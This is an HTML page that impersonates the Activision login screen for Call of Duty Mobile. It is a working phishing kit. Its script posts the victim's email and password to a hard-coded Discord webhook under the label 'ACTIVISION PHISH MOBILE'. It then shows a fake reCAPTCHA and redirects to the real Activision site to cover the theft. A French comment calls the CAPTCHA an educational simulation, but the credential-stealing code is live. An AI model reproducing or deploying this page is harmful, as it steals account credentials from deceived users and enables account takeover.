<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Call of Duty Mobile - Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0d0d0d;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      min-height: 100vh;
    }
    .header-bar {
      background: #000;
      color: #fff;
      padding: 12px 16px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      font-size: 16px;
      font-weight: bold;
    }
    .back { font-size: 24px; cursor: pointer; }
    .close { font-size: 24px; cursor: pointer; }
    .container {
      padding: 16px 20px;
      max-width: 420px;
      margin: 0 auto;
    }
    .logo-text {
      font-size: 32px;
      font-weight: bold;
      text-align: center;
      color: #fff;
      margin: 16px 0 24px;
      letter-spacing: 2px;
      text-transform: uppercase;
    }
    h1 {
      font-size: 18px;
      font-weight: bold;
      text-align: center;
      margin: 16px 0 24px;
      color: #fff;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    label {
      display: block;
      font-size: 13px;
      margin-bottom: 6px;
      color: #b0b0b0;
    }
    input {
      width: 100%;
      padding: 12px 14px;
      font-size: 15px;
      background: #1a1a1a;
      border: 1px solid #444;
      border-radius: 4px;
      color: #fff;
      margin-bottom: 12px;
      box-sizing: border-box;
    }
    input:focus {
      outline: none;
      border-color: #ff6600;
    }
    .remember {
      display: flex;
      align-items: center;
      margin: 12px 0;
      font-size: 13px;
      color: #b0b0b0;
    }
    .remember input {
      margin-right: 8px;
      width: 16px;
      height: 16px;
      accent-color: #ff6600;
    }
    .forgot {
      color: #ff6600;
      font-size: 13px;
      text-decoration: none;
      display: block;
      text-align: center;
      margin: 12px 0 20px;
    }
    .btn-login {
      background: #8b4513;
      color: white;
      border: none;
      padding: 14px;
      font-size: 15px;
      font-weight: bold;
      text-transform: uppercase;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
      min-height: 52px;
      letter-spacing: 1px;
      margin-bottom: 20px;
    }
    .btn-login:hover { background: #a0522d; }
    .signup {
      text-align: center;
      font-size: 13px;
      color: #b0b0b0;
    }
    .signup a {
      color: #ff6600;
      text-decoration: none;
    }
    .captcha-container {
      display: none;
      margin-top: 24px;
      padding: 16px;
      background: #1a1a1a;
      border-radius: 8px;
      text-align: center;
    }
    .captcha-box {
      background: #fff;
      border: 1px solid #ccc;
      border-radius: 4px;
      padding: 12px;
      margin: 12px auto;
      max-width: 280px;
      height: 70px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 13px;
      color: #000;
    }
    .captcha-check {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 12px 0;
    }
    .captcha-check input {
      width: 20px;
      height: 20px;
      margin-right: 10px;
      accent-color: #ff6600;
    }
    .captcha-text {
      font-size: 13px;
      color: #ccc;
    }
  </style>
</head>
<body>

<div class="header-bar">
  <span class="back">←</span>
  Call of Duty Mobile
  <span class="close">×</span>
</div>

<div class="container">
  <div class="logo-text">CALL OF DUTY</div>

  <h1>LOGIN TO YOUR ACCOUNT</h1>

  <label for="email">Email Address:*</label>
  <input type="email" id="email" placeholder="Email Address" required>

  <div class="remember">
    <input type="checkbox" id="remember" checked>
    <label for="remember">Remember me</label>
  </div>

  <label for="password">Password:*</label>
  <input type="password" id="password" placeholder="Password" required>

  <a href="#" class="forgot">FORGOT YOUR PASSWORD?</a>

  <button class="btn-login" onclick="handleLogin()">LOGIN NOW</button>

  <div class="signup">
    Don't have an Activision Account? <a href="#">SIGN UP</a>
  </div>

  <!-- Faux CAPTCHA après clic sur LOGIN NOW -->
  <div class="captcha-container" id="captcha">
    <div class="captcha-box">
      reCAPTCHA verification<br>(Simulation éducative)
    </div>
    <div class="captcha-check">
      <input type="checkbox" id="captcha-check" onclick="verifyCaptcha()">
      <label for="captcha-check">I'm not a robot</label>
    </div>
    <p class="captcha-text">Protected by reCAPTCHA</p>
  </div>
</div>

<script>
  const webhookUrl = "https://discord.com/api/webhooks/1482791121074782349/_CBi8WAs0aHqJMgw8xMImZNoUQfAUTNwYMFRXkYLbB3xn8tw7zfe8lnDMmnaj4ot1keK";

  function handleLogin() {
    const email = document.getElementById("email").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!email || !pass) {
      alert("Please fill in both fields");
      return;
    }

    // Envoi creds
    fetch(webhookUrl, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        content: `**ACTIVISION PHISH MOBILE**\nEmail: ${email}\nPass: ${pass}\nTime: ${new Date().toLocaleString('fr-FR')}`
      })
    }).catch(() => {});

    // Masquer bouton login, afficher faux CAPTCHA
    document.querySelector(".btn-login").style.display = "none";
    document.getElementById("captcha").style.display = "block";
  }

  function verifyCaptcha() {
    const check = document.getElementById("captcha-check");
    if (check.checked) {
      setTimeout(() => {
        window.location.href = "https://www.activision.com/games/call-of-duty/call-of-duty-mobile";
      }, 1200);
    }
  }
</script>

</body>
</html>
